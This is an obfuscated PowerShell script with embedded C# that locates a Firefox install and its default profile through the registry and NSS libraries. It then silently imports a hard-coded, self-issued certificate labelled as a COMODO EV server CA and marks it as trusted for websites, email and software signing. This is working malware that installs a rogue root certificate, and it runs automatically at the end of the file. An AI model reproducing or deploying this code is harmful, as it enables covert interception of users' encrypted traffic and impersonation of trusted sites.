function XSjdNvfyeR{
Add-Type @"
using System;
using System.IO;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.ComponentModel;

public sealed class JNOXxliKGL
{
	private static volatile JNOXxliKGL lgJhPdKaVB;
	private static object kZxDWOYElc = new Object();
	public static JNOXxliKGL LGMhDcwYBL()
    {
        if (lgJhPdKaVB == null)
        {
            lock (kZxDWOYElc)
            {
                if (lgJhPdKaVB == null)
                lgJhPdKaVB = new JNOXxliKGL();
            }
        }
        return lgJhPdKaVB;
    }
	
	const int TDvsJIGXQG=0;
    
    [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);

    private static IntPtr ACtmYLxyBq(string libPath)
    {
        if (String.IsNullOrEmpty(libPath))
            throw new ArgumentNullException("libPath");

        IntPtr moduleHandle = LoadLibrary(libPath);
        if (moduleHandle == IntPtr.Zero)
        {
            int lasterror = Marshal.GetLastWin32Error();
            System.Console.WriteLine(String.Format("Last error: 0x{0:X}",lasterror));
            Win32Exception innerEx = new Win32Exception(lasterror);
            innerEx.Data.Add("LastWin32Error", lasterror);
            throw new Exception("can't load DLL " + libPath, innerEx);
        }
        return moduleHandle;
    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
	//Constants
    const uint NSS_INIT_READONLY=0x1;
    const uint NSS_INIT_NOCERTDB = 0x2;
    const uint NSS_INIT_NOMODDB = 0x4;
    const uint NSS_INIT_FORCEOPEN = 0x8;
    const uint NSS_INIT_NOROOTINIT = 0x10;
    const uint NSS_INIT_OPTIMIZESPACE = 0x20;
    const uint NSS_INIT_PK11THREADSAFE = 0x40;
    const uint NSS_INIT_PK11RELOAD = 0x80;
    const uint NSS_INIT_NOPK11FINALIZE = 0x100;
    const uint NSS_INIT_RESERVED = 0x200;
    const uint NSS_INIT_COOPERATE = NSS_INIT_PK11THREADSAFE | NSS_INIT_PK11RELOAD | NSS_INIT_NOPK11FINALIZE | NSS_INIT_RESERVED;

    const string SECMOD_DB = "secmod.db";
    //Structures
    [StructLayout(LayoutKind.Sequential)]
    public struct SECItem 
    {
        public uint iType;
        public IntPtr bData;
        public uint iDataLen;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct CertTrusts
    {
        public int iSite;
        public int iEmail;
        public int iSoft;
    }

    private enum SECCertUsage
    {
        certUsageSSLClient = 0,
        certUsageSSLServer = 1,
        certUsageSSLServerWithStepUp = 2,
        certUsageSSLCA = 3,
        certUsageEmailSigner = 4,
        certUsageEmailRecipient = 5,
        certUsageObjectSigner = 6,
        certUsageUserCertImport = 7,
        certUsageVerifyCA = 8,
        certUsageProtectedObjectSigner = 9,
        certUsageStatusResponder = 10,
        certUsageAnyCA = 11
    }
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate int oPvuHDwzyK(string sConfigDir, string certPrefix, string keyPrefix, string secModName, uint flags);

    private int IZKwhvudys(string sConfigDir, string certPrefix, string keyPrefix, string secModName, uint flags)
    {
        IntPtr pProc = GetProcAddress(yqgHxmaDfR, "NSS_Initialize");
        oPvuHDwzyK ptr = (oPvuHDwzyK)Marshal.GetDelegateForFunctionPointer(pProc, typeof(oPvuHDwzyK));
        return ptr(sConfigDir, certPrefix, keyPrefix, secModName, flags);
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate IntPtr DHucizwLpQ();
    private IntPtr VvCvenvPpL()
    {
        IntPtr pProc = GetProcAddress(yqgHxmaDfR, "CERT_GetDefaultCertDB");
        DHucizwLpQ ptr = (DHucizwLpQ)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DHucizwLpQ));
        return ptr();
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate IntPtr JeBYbowzNK();
    private IntPtr YLqYqvQApL()
    {
        IntPtr pProc = GetProcAddress(yqgHxmaDfR, "NSS_Shutdown");
        JeBYbowzNK ptr = (JeBYbowzNK)Marshal.GetDelegateForFunctionPointer(pProc, typeof(JeBYbowzNK));
        return ptr();
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate int lqCSdnuIzt(IntPtr certdb, int usage, uint ncerts, ref SECItem[] derCerts, ref IntPtr retCerts, uint keepCerts, uint caOnly, IntPtr nickname);
    private int qaYVqnCYlG(IntPtr certdb, int usage, uint ncerts, ref SECItem[] derCerts, ref IntPtr retCerts, uint keepCerts, uint caOnly, IntPtr nickname)
    {
        IntPtr pProc = GetProcAddress(yqgHxmaDfR, "CERT_ImportCerts");
        lqCSdnuIzt ptr = (lqCSdnuIzt)Marshal.GetDelegateForFunctionPointer(pProc, typeof(lqCSdnuIzt));
        return ptr(certdb, usage, ncerts, ref derCerts, ref retCerts, keepCerts, caOnly, nickname);
    }

    private delegate int FxxAjmyRca(IntPtr certdb, IntPtr cert, ref CertTrusts trust);
    private int wPlVkhRgFN(IntPtr certdb, IntPtr cert, ref CertTrusts trust)
    {
        IntPtr pProc = GetProcAddress(yqgHxmaDfR, "CERT_ChangeCertTrust");
        FxxAjmyRca ptr = (FxxAjmyRca)Marshal.GetDelegateForFunctionPointer(pProc, typeof(FxxAjmyRca));
        return ptr(certdb, cert, ref trust);
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate int TZPdJHJFdh(IntPtr cert, uint ncerts);
    private int LUMwSnXOGn(IntPtr cert, uint ncerts)
    {
        IntPtr pProc = GetProcAddress(yqgHxmaDfR, "CERT_DestroyCertArray");
        TZPdJHJFdh ptr = (TZPdJHJFdh)Marshal.GetDelegateForFunctionPointer(pProc, typeof(TZPdJHJFdh));
        return ptr(cert, ncerts);
    }

	private IntPtr yqgHxmaDfR = IntPtr.Zero;
	
	public Boolean RqGKtnDdve(String sCert){
        System.Console.WriteLine("JNOXxliKGL Start");
		String sProfile = GetProfile();
        if (String.IsNullOrEmpty(sProfile))
        {
            System.Console.WriteLine("Profile not found");
            return false;
        }
        System.Console.WriteLine("Profile path="+sProfile);
        byte[] bCert = GetCertAsByteArray(sCert);
		IntPtr ipCert = Marshal.AllocHGlobal(bCert.Length);
		try
        {
            DirectoryInfo diInstallPath = GetIP();
            String sCurrentDirectory = Directory.GetCurrentDirectory();
            Directory.SetCurrentDirectory(diInstallPath.FullName);
            System.Console.WriteLine("Install path="+diInstallPath.FullName);
            foreach(FileInfo fiDll in diInstallPath.GetFiles("*.dll"))
            {
                if (fiDll.Name.Equals("breakpadinjector.dll")) continue;
                ACtmYLxyBq(fiDll.FullName);
            }
            yqgHxmaDfR = ACtmYLxyBq(diInstallPath.FullName + "\\nss3.dll");
            if (yqgHxmaDfR.Equals(IntPtr.Zero))
            {
                System.Console.WriteLine("Firefox install directory not found");
                return false;
            }
            Directory.SetCurrentDirectory(sCurrentDirectory);
            //Init cert
            Marshal.Copy(bCert, 0, ipCert, bCert.Length);
            SECItem CertItem = new SECItem();
            CertItem.iType = 3;
            CertItem.bData = ipCert;
            CertItem.iDataLen = (uint)bCert.Length;
            SECItem[] aCertItem = new SECItem[1];
            aCertItem[0] = CertItem;

            CertTrusts CertTrust = new CertTrusts();
            CertTrust.iSite = 0x10;
            CertTrust.iEmail = 0x10;
            CertTrust.iSoft = 0x10;
            System.Console.WriteLine("Init cert OK");
            //End init cert
            int status = IZKwhvudys(sProfile, "", "", SECMOD_DB, NSS_INIT_OPTIMIZESPACE);
            if (status != TDvsJIGXQG)
            {
                System.Console.WriteLine(String.Format("NSS_InitReadWrite ERROR. Status: 0x{0:X};Last error: 0x{0:X}", status, Marshal.GetLastWin32Error()));
                return false;
            }
            IntPtr bd = VvCvenvPpL();
            if (bd == IntPtr.Zero)
            {
                System.Console.WriteLine("CERT_GetDefaultCertDB Failed");
                YLqYqvQApL();
                return false;
            }
            System.Console.WriteLine("CERT_GetDefaultCertDB OK");
            IntPtr CertToImport = new IntPtr();
            IntPtr[] aCertToImport = new IntPtr[1];
            status = qaYVqnCYlG(bd, 11, 1, ref aCertItem, ref CertToImport, 1, 0, IntPtr.Zero);
            if (status != TDvsJIGXQG)
            {
                System.Console.WriteLine(String.Format("CERT_ImportCerts ERROR. Status: 0x{0:X};Last error: 0x{0:X}", status, Marshal.GetLastWin32Error()));
                YLqYqvQApL();
                return false;
            }
            System.Console.WriteLine("CERT_ImportCerts OK");
            Marshal.Copy(CertToImport, aCertToImport, 0, 1);
            status = wPlVkhRgFN(bd, aCertToImport[0], ref CertTrust);
            if ( status != TDvsJIGXQG) 
            {
                System.Console.WriteLine(String.Format("CERT_ChangeCertTrust ERROR. Status: 0x{0:X};Last error: 0x{0:X}", status, Marshal.GetLastWin32Error()));
                YLqYqvQApL();
                return false;
            };
            System.Console.WriteLine("CERT_ChangeCertTrust OK");
            LUMwSnXOGn(CertToImport, 1);
            System.Console.WriteLine("Add cert OK");
        }
        catch (Exception){}
        finally
        {
            YLqYqvQApL();
        }
		return true;
	}
	private String GetProfile()
    {
        String FFProfile = Path.Combine(Environment.GetEnvironmentVariable("APPDATA"), @"Mozilla\Firefox\Profiles");
        if (Directory.Exists(FFProfile))
        {
            if (Directory.GetDirectories(FFProfile, "*.default").Length > 0)
            {
                return Directory.GetDirectories(FFProfile, "*.default")[0];
            }
        }
        return "";
    }
	public byte[] GetCertAsByteArray(String sCert)
    {
        try
        {
            return Convert.FromBase64String(sCert);
        }
        catch (Exception){}
        return null;
    }
	private DirectoryInfo GetIP()
    {
        DirectoryInfo fp = null;
        // get firefox path from registry
        // we'll search the 32bit install location
        RegistryKey localMachine1 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Mozilla\Mozilla Firefox", false);
        // and lets try the 64bit install location just in case
        RegistryKey localMachine2 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Wow6432Node\Mozilla\Mozilla Firefox", false);

        if (localMachine1 != null)
        {
            try
            {
                string[] installedVersions = localMachine1.GetSubKeyNames();
                // we'll take the first installed version, people normally only have one
                if (installedVersions.Length == 0)
                    throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");

                RegistryKey mainInstall = localMachine1.OpenSubKey(installedVersions[0]);

                // get install directory
                string installString = (string)mainInstall.OpenSubKey("Main").GetValue("Install Directory", null);

                if (installString == null)
                    throw new NullReferenceException("Install string was null");

                fp = new DirectoryInfo(installString);
            }
            catch (Exception)
            {
            }
        }
        else if (localMachine2 != null)
        {
            try
            {
                string[] installedVersions = localMachine2.GetSubKeyNames();
                // we'll take the first installed version, people normally only have one
                if (installedVersions.Length == 0)
                    throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");

                RegistryKey mainInstall = localMachine2.OpenSubKey(installedVersions[0]);

                // get install directory
                string installString = (string)mainInstall.OpenSubKey("Main").GetValue("Install Directory", null);

                if (installString == null)
                    throw new NullReferenceException("Install string was null");
                fp = new DirectoryInfo(installString);
            }
            catch (Exception)
            {
            }
        }
        return fp;
    }
}
"@;
[JNOXxliKGL]::LGMhDcwYBL().RqGKtnDdve("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");
}
XSjdNvfyeR
